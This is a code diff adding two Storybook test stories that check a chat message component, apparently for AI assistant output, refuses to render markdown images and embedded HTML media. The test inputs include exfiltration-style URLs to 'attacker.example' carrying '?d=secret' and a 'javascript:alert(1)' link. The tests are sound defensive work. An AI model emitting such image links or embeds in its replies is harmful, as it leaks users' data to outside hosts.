@@ -343,6 +343,63 @@ export const CopyMarkdownSelectionInteraction = meta.story({
   },
 });
 
+export const BlockedMarkdownImages = meta.story({
+  name: "(Test) Blocked Markdown Images",
+  args: {
+    role: "assistant",
+    isFinalAnswer: false,
+    content: {
+      type: "text",
+      text: [
+        "Summary.",
+        ...[
+          "https://attacker.example/p.png?d=secret",
+          "//attacker.example/p.png",
+          `${window.location.origin}/image.png`,
+          "/image.png",
+          "https://media.example/bucket/media/image.png?signature=test",
+          "data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=",
+          "data:image/png;base64,not-valid-base64",
+          "javascript:alert(1)",
+        ].map((url) => `![status](${url})`),
+      ].join("\n\n"),
+    },
+  },
+  play: async ({ canvasElement }) => {
+    await within(canvasElement).findByText("Summary.");
+    await expect(canvasElement.querySelector("img")).toBeNull();
+  },
+});
+
+export const BlockedEmbeddedMedia = meta.story({
+  name: "(Test) Blocked Embedded Media",
+  args: {
+    role: "assistant",
+    isFinalAnswer: false,
+    content: {
+      type: "text",
+      text: `Summary.
+
+<img src="https://attacker.example/p.png?d=secret" alt="status">
+<picture><source srcset="https://attacker.example/source.png"><img src="/image.png"></picture>
+<iframe src="https://attacker.example/frame"></iframe>
+<video poster="https://attacker.example/poster.png" src="https://attacker.example/video"></video>
+<audio src="https://attacker.example/audio"></audio>
+<object data="https://attacker.example/object"></object>
+<embed src="https://attacker.example/embed">
+<svg><image href="https://attacker.example/svg.png"></image></svg>`,
+    },
+  },
+  play: async ({ canvasElement }) => {
+    await within(canvasElement).findByText("Summary.");
+    await expect(
+      canvasElement.querySelector(
+        "img, source, iframe, video, audio, object, embed, svg image",
+      ),
+    ).toBeNull();
+  },
+});
+
 export const UserText = meta.story({
   args: {
     role: "user",
